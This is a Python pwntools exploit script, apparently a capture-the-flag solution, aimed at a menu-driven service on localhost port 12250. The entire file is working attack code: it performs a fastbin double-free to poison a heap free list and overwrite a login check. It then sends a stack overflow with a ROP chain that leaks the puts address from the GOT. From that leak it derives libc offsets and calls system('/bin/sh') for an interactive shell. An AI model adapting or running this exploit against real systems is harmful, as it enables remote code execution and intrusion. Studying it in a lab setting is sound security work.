from pwn import *


def next(payload):
    s = p.recvuntil(payload)


def wait_menu():
    next('$ ')


def malloc(chunk_num, size):
    wait_menu()
    p.sendline('1')
    next('Number: ')
    p.sendline(str(chunk_num))
    next('Size: ')
    p.sendline(str(size))
    next('Data: ')
    p.send('a' * (size-1))


def free(chunk_num):
    wait_menu()
    p.sendline('2')
    next('number: ')
    p.sendline(str(chunk_num))


def overflow(data):
    wait_menu()
    p.sendline('201527')
    next('Data: ')
    p.send(data)


def login(data):
    wait_menu()
    p.sendline('4')
    next('password: ')
    p.send(data)


def ret():
    wait_menu()
    p.sendline('5')


# context.log_level = 'debug'

p = remote('localhost', 12250)


malloc(1, 0x60)  # chunk A
malloc(2, 0x60)  # chunk B

# fastbin -> B
free(2)

# fastbin -> A -> B
free(1)

# fastbin -> B -> A -> B -> A -> ...
free(2)

# Overflow A to overwrite B's fd pointer
# fastbin -> B -> fake

# 0x602075 = 0x7f
fake_addr = 0x602075 - 8

overflow('a'*0x60 + p64(0) + p64(0x71) + p64(fake_addr))

malloc(2, 0x60)  # B
malloc(1, 0x60)  # fake, login_check is overwritten
log.success('login_check is overwritten')

# ROP part
puts_got_plt = 0x602020
puts_plt = 0x400600
main = 0x400680

pop_rdi_ret = 0x4008a0

# leak puts
login('B'*1032 + p64(pop_rdi_ret) + p64(puts_got_plt) + p64(puts_plt) + p64(main))
ret()

puts_str = p.recvuntil('WELCOME')[:-8]
puts_str += '\x00'*(8 - len(puts_str))
puts_addr = u64(puts_str)
log.success('puts addr: {:#x}'.format(puts_addr))

# call system
system_offset = 0x45390
puts_offset = 0x6f690
binsh_offset = 0x18c177

system_addr = puts_addr - puts_offset + system_offset
binsh_addr = puts_addr - puts_offset + binsh_offset

login('B'*1032 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr))
ret()

p.interactive()
